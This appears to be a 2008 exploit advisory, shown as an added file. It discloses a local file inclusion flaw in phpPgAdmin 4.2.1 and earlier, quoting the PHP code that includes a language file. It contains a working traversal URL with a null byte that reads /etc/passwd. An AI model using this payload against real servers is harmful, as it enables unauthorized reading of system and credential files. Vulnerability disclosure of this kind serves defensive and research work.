@@ -1,0 +1,84 @@
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##################################################################
+ #  [ phpPgAdmin <= 4.2.1 ]  Local File Inclusion Vulnerability   #
+ ##################################################################
+ #
+ # Script: "phpPgAdmin is a web-based administration tool for PostgreSQL. It is perfect for PostgreSQL DBAs, newbies and hosting services."
+ #
+ # Script site: http://www.phppgadmin.org/
+ # Download: http://phppgadmin.sourceforge.net/?page=download
+ #
+ # Vuln: http://site.com/phpPgAdmin/index.php?_language=../../../../../../../../etc/passwd%00
+ #
+ # Bug: ./phpPgAdmin-4.2.1/index.php (line: 11)
+ #
+ # ...
+ #	include_once('./libraries/lib.inc.php');
+ # ... 	 
+ #
+ #
+ # Bug: ./phpPgAdmin-4.2.1/libraries/lib.inc.php (lines: 22-138 -> 136)
+ #
+ # ...
+ #	// Determine language file to import:
+ #	// 1. Check for the language from a request var
+ #	if (isset($_REQUEST['language']) && isset($appLangFiles[$_REQUEST['language']]))
+ #		$_language = $_REQUEST['language']; 
+ #
+ #	// 2. Check for language session var
+ #	if (!isset($_language) && isset($_SESSION['webdbLanguage']) && isset($appLangFiles[$_SESSION['webdbLanguage']])) {
+ #		$_language = $_SESSION['webdbLanguage'];
+ #	}
+ #
+ #	// 3. Check for acceptable languages in HTTP_ACCEPT_LANGUAGE var
+ #	if (!isset($_language) && $conf['default_lang'] == 'auto' && isset($_SERVER['HTTP_ACCEPT_LANGUAGE'])) {
+ #		// extract acceptable language tags
+ #		// (http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.4)
+ #		preg_match_all('/\s*([a-z]{1,8}(?:-[a-z]{1,8})*)(?:;q=([01](?:.[0-9]{0,3})?))?\s*(?:,|$)/', strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']), $_m, PREG_SET_ORDER);
+ #		foreach($_m as $_l) {  // $_l[1] = language tag, [2] = quality
+ #			if (!isset($_l[2])) $_l[2] = 1;  // Default quality to 1
+ #			if ($_l[2] > 0 && $_l[2] <= 1 && isset($availableLanguages[$_l[1]])) {
+ #				// Build up array of (quality => language_file)
+ #				$_acceptLang[$_l[2]] = $availableLanguages[$_l[1]];
+ #			}
+ #		}
+ #		unset($_m);
+ #		unset($_l);
+ #		if (isset($_acceptLang)) {
+ #			// Sort acceptable languages by quality
+ #			krsort($_acceptLang, SORT_NUMERIC);
+ #			$_language = reset($_acceptLang);
+ #			unset($_acceptLang);
+ #		}
+ #	} 
+ #
+ #	// 4. Otherwise resort to the default set in the config file
+ #	if (!isset($_language) && $conf['default_lang'] != 'auto' && isset($appLangFiles[$conf['default_lang']])) {
+ #		$_language = $conf['default_lang'];
+ #	}
+ #
+ #	// Import the language file
+ #	if (isset($_language)) {
+ #		include("./lang/recoded/{$_language}.php");									// * LFI *
+ #		$_SESSION['webdbLanguage'] = $_language;
+ #	}
+ # ... 	 
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-12-06]
